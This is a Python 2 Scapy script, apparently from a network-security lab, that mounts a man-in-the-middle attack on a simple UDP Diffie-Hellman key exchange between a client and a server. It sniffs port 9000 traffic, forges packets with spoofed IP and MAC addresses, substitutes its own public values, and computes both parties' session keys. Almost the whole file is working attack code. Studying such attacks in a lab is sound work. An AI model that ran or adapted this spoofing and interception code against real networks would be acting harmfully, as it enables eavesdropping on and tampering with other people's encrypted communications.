#!/usr/bin/python2

from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import Ether


# Machine B's information
IP_B = "192.168.60.1"
MAC_B = "02:42:52:1f:a3:e0"

# Machine A's information
IP_A = "192.168.60.2"
MAC_A = "02:42:c0:a8:3c:02"

# Attacker Machine's information
IP_M = "192.168.60.3"
MAC_M = "02:42:c0:a8:3c:03"

# Server2 Machine's information
IP_S = "10.0.2.7"

# sysctl net.ipv4.ip_forward=0

# udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
port = 9000

p = 65537
g = 3
a = 100
Ya = 0
key_Client = 0
key_Server = 0
t = 0


def spoof_pkt(pkt):
    global IP_A, IP_B, IP_S, MAC_A, MAC_B, MAC_M, port, p, g, a, Ya, key_Server, key_Client, t
    if pkt.src == MAC_M:
        return
    if UDP in pkt:
        data = pkt[UDP].payload.load
        head = data[:10]
        body = data[10:]

        if head == 'send_p_g  ':
            p, g = body.split(',')
            p = int(p)
            g = int(g)
            print('p:', p, ',g:', g)

            # send To A
            a = int(random.random() * p)
            Ya = pow(g, a, p)
            print('b:', a, ',Yb:', Ya, ' .send_Yb to A')
            send_Yb = 'send_Yb   ' + str(Ya)
            # udp_socket.sendto(send_Yb.encode('utf-8'), (IP_A, port))
            npkt = pkt
            npkt[Ether].src = MAC_M
            npkt[Ether].dst = MAC_A
            del npkt[IP].len
            del npkt[IP].chksum
            del npkt[UDP].payload
            del npkt[UDP].len
            del npkt[UDP].chksum
            npkt[IP].src = IP_S
            npkt[IP].dst = IP_A
            newpkt = npkt / send_Yb.encode('utf-8')
            sendp(newpkt)

            # send To Server
            p_g = 'send_p_g  ' + str(p) + ',' + str(g)
            print('p:', p, ',g:', g)
            # udp_socket.sendto(p_g.encode('utf-8'), (IP_B, port))
            npkt = pkt
            npkt[Ether].src = MAC_M
            npkt[Ether].dst = MAC_B
            del npkt[IP].len
            del npkt[IP].chksum
            del npkt[UDP].payload
            del npkt[UDP].len
            del npkt[UDP].chksum
            npkt[IP].src = IP_A
            npkt[IP].dst = IP_S
            newpkt = npkt / p_g.encode('utf-8')
            sendp(newpkt)
        elif head == 'send_Ya   ':
            Ya = int(body)
            key_Client = pow(Ya, a, p)
            print('Key of A', key_Client)
        if head == 'send_Yb   ':
            Ya = pow(g, a, p)
            print('a:', a, ',Ya:', Ya, ' .send_Ya to Server')
            send_Ya = 'send_Ya   ' + str(Ya)
            # udp_socket.sendto(send_Ya.encode('utf-8'), (IP_B, port))
            pkt[Ether].src = MAC_M
            pkt[Ether].dst = MAC_B
            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[UDP].payload
            del pkt[UDP].len
            del pkt[UDP].chksum
            pkt[UDP].dport = port
            pkt[IP].src = IP_A
            pkt[IP].dst = IP_S
            newpkt = pkt / send_Ya.encode('utf-8')
            sendp(newpkt)

            Yb = int(body)
            key_Server = pow(Yb, a, p)
            print('Key of Server', key_Server)
        elif head == 'message   ':
            c = int(body)
            print('get message', c)


pkt = sniff(filter="udp port 9000", prn=spoof_pkt, iface='eth0')
